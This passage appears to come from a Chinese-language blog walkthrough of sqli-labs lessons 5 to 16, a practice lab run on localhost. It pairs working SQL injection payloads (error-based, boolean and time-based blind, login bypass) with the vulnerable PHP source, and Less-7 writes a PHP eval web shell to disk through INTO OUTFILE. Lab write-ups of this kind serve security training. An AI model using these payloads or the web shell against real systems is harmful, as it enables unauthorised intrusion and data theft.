class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">union</span> <span class="literal">select</span> (!(<span class="literal">select</span> * from (<span class="literal">select</span> user())x) - ~<span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨xpath-å‡½æ•°æŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨xpath-å‡½æ•°æŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨xpath å‡½æ•°æŠ¥é”™æ³¨å…¥"></a>åˆ©ç”¨xpath å‡½æ•°æŠ¥é”™æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/k4lyGzREivtZDOj.png" alt="5_2.png"></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> updatexml(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>) --+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/qBsh1nNgyuUOJk4.png" alt="5_3.png"></p><h5 id="åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§"><a href="#åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§" class="headerlink" title="åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§"></a>åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> from (<span class="literal">select</span> NAME_CONST(version(),<span class="number">1</span>), NAME_CONST(version(),<span class="number">1</span>))x--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/OoRQ4mK8lukwNcq.png" alt="5_4.png"></p><h5 id="å»¶æ—¶æ³¨å…¥"><a href="#å»¶æ—¶æ³¨å…¥" class="headerlink" title="å»¶æ—¶æ³¨å…¥"></a>å»¶æ—¶æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;UNION SELECT (IF(SUBSTRING(current,<span class="number">1</span>,<span class="number">1</span>)=CHAR(<span class="number">115</span>),BENCHMARK(<span class="number">50000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),null)),<span class="number">2</span>,<span class="number">3</span> FROM (<span class="literal">select</span> database() as cur</span><br><span class="line">rent) as tb1--+</span><br></pre></td></tr></table></figure><h3 id="Less-6-GET-Double-Injection-Double-Quotes-String-åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-6 GET - Double Injection - Double Quotes - String (åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-4"><a href="#æ‰‹åŠ¨æ³¨å…¥-4" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åˆ©ç”¨æŠ¥é”™æ³¨å…¥å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-6/?id=1&quot;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-5"><a href="#æºç åˆ†æ-5" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨<code>&quot;&quot;</code>æ¥å¤„ç†<code>$id</code>ï¼Œä¸å›æ˜¾æ­£å¸¸è¾“å‡ºçš„ä¿¡æ¯ã€‚</p><h3 id="Less-7-GET-Dump-into-outfile-String-ï¼ˆå¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥ï¼‰"><a href="#Less-7-GET-Dump-into-outfile-String-ï¼ˆå¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥ï¼‰" class="headerlink" title="Less-7 GET - Dump into outfile - String ï¼ˆå¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥ï¼‰"></a>Less-7 GET - Dump into outfile - String ï¼ˆå¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥ï¼‰</h3><h4 id="æºç åˆ†æ-6"><a href="#æºç åˆ†æ-6" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ˜¯ä½¿ç”¨äº†<code>((&#39;&#39;))</code>æ¥å¤„ç†è¾“å…¥ã€‚</p><h4 id="æ‰‹åŠ¨æ³¨å…¥-5"><a href="#æ‰‹åŠ¨æ³¨å…¥-5" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;)) <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#å°†user,2,3å†™å…¥æ–‡ä»¶uuu.txtä¸­</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT user(),<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;txtæ–‡ä»¶è·¯å¾„&quot;</span>--+</span><br><span class="line"><span class="comment">#å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥è¿›å»</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT <span class="string">&#x27;&lt;?php <span class="variable">@eval</span>(<span class="variable">$_POST</span>[&quot;attack&quot;])?&gt;&#x27;</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;phpæ–‡ä»¶è·¯å¾„&quot;</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes-å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨" class="headerlink" title="Less-8 GET - Blind - Boolian Based - Single Quotes (å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨)"></a>Less-8 GET - Blind - Boolian Based - Single Quotes (å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-6"><a href="#æ‰‹åŠ¨æ³¨å…¥-6" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æµ‹è¯•æ³¨å…¥ç‚¹</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#å¸ƒå°”ç›²æ³¨</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27; and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-7"><a href="#æºç åˆ†æ-7" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€å…³é”™è¯¯ä¿¡æ¯ä¹Ÿä¸å†å›æ˜¾ï¼Œä½†å¯ä»¥é€šè¿‡æ˜¯å¦å‡ºç°<code>You are in...........</code>æ¥å®ç°å¸ƒå°”ç›²æ³¨ã€‚</p><h3 id="Less-9-GET-Blind-Time-based-Single-Quotes-åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes-åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨" class="headerlink" title="Less-9 GET - Blind - Time based. - Single Quotes (åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨)"></a>Less-9 GET - Blind - Time based. - Single Quotes (åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-7"><a href="#æ‰‹åŠ¨æ³¨å…¥-7" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ—¶é—´ç›²æ³¨</span></span><br><span class="line"><span class="comment">#çŒœæµ‹æ•°æ®åº“security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;and If(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-8"><a href="#æºç åˆ†æ-8" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-10-GET-Blind-Time-based-double-quotes-åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨"><a href="#Less-10-GET-Blind-Time-based-double-quotes-åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨" class="headerlink" title="Less-10 GET - Blind - Time based - double quotes (åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨)"></a>Less-10 GET - Blind - Time based - double quotes (åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨)</h3><p>è¾“å…¥è¢«ç”¨<code>&quot;&quot;</code>å¤„ç†ï¼Œå…¶ä»–ä¸less-9ç›¸åŒã€‚</p><h3 id="Less-11-POST-Error-Based-Single-quotes-String-åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-11-POST-Error-Based-Single-quotes-String-åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-11 POST - Error Based - Single quotes- String (åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-11 POST - Error Based - Single quotes- String (åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-8"><a href="#æ‰‹åŠ¨æ³¨å…¥-8" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>postæ¥æ”¶å‚æ•°</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¸‡èƒ½ï¼Œå¯†ç éšæ„</span></span><br><span class="line">admin&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#çˆ†åº“åï¼Œå¯†ç éšæ„</span></span><br><span class="line">1admin<span class="string">&#x27;union select 1,database()#</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-9"><a href="#æºç åˆ†æ-9" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist-åŸºäºé”™è¯¯çš„åŒå¼•å·POSTå‹å­—ç¬¦å‹å˜å½¢çš„æ³¨å…¥"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-åŸºäºé”™è¯¯çš„åŒå¼•å·POSTå‹å­—ç¬¦å‹å˜å½¢çš„æ³¨å…¥" class="headerlink" title="Less-12 POST - Error Based - Double quotes- String-with twist (åŸºäºé”™è¯¯çš„åŒå¼•å·POSTå‹å­—ç¬¦å‹å˜å½¢çš„æ³¨å…¥)"></a>Less-12 POST - Error Based - Double quotes- String-with twist (åŸºäºé”™è¯¯çš„åŒå¼•å·POSTå‹å­—ç¬¦å‹å˜å½¢çš„æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-9"><a href="#æ‰‹åŠ¨æ³¨å…¥-9" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#postä¼ å…¥</span></span><br><span class="line">uname=1&quot;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-10"><a href="#æºç åˆ†æ-10" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-13-POST-Double-Injection-Single-quotes-String-twist-POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-twist-POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥" class="headerlink" title="Less-13 POST - Double Injection - Single quotes- String -twist (POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥)"></a>Less-13 POST - Double Injection - Single quotes- String -twist (POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-10"><a href="#æ‰‹åŠ¨æ³¨å…¥-10" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>å…ˆç”¨ä¸‡èƒ½å¯†ç ç™»å½•ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/j7OKIP4yh2SV8x5.png" alt="13.png"></p><p>ç™»å½•æˆåŠŸåä¾¿å¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨çˆ†åº“ç­‰ä¿¡æ¯ã€‚</p><h4 id="æºç åˆ†æ-11"><a href="#æºç åˆ†æ-11" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-14-POST-Double-Injection-Single-quotes-String-twist-POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥" class="headerlink" title="Less-14 POST - Double Injection - Single quotes- String -twist (POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥)"></a>Less-14 POST - Double Injection - Single quotes- String -twist (POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-11"><a href="#æ‰‹åŠ¨æ³¨å…¥-11" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¸‡èƒ½å¯†ç </span></span><br><span class="line">admin&quot;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#æŠ¥é”™æ³¨å…¥</span></span><br><span class="line">uname=admin<span class="string">&quot;and extractvalue(1,concat(0x7e,(select @<span class="variable">@version</span>),0x7e))#&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/JoPmqcNLdfSwTi7.png" alt="14.png"></p><h4 id="æºç åˆ†æ-12"><a href="#æºç åˆ†æ-12" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-åŸºäºboolå‹-x2F-æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹ç›²æ³¨"><a href="#less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-åŸºäºboolå‹-x2F-æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹ç›²æ³¨" class="headerlink" title="less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (åŸºäºboolå‹&#x2F;æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹ç›²æ³¨)"></a>less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (åŸºäºboolå‹&#x2F;æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-12"><a href="#æ‰‹åŠ¨æ³¨å…¥-12" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä½¿ç”¨å»¶æ—¶æ³¨å…¥ï¼Œæ­£ç¡®ç›´æ¥ç™»å½•æˆåŠŸï¼Œå¦åˆ™å»¶æ—¶5sã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-13"><a href="#æºç åˆ†æ-13" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-åŸºäºboolå‹-x2F-æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨"><a href="#Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-åŸºäºboolå‹-x2F-æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨" class="headerlink" title="Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (åŸºäºboolå‹&#x2F;æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨)"></a>Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (åŸºäºboolå‹&#x2F;æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-13"><a href="#æ‰‹åŠ¨æ³¨å…¥-13" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä½¿ç”¨å»¶æ—¶æ³¨å…¥ï¼Œæ­£ç¡®ç›´æ¥ç™»å½•æˆåŠŸï¼Œå¦åˆ™å»¶æ—¶5sã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&quot;)<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-14"><a href="#æºç åˆ†æ-14" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 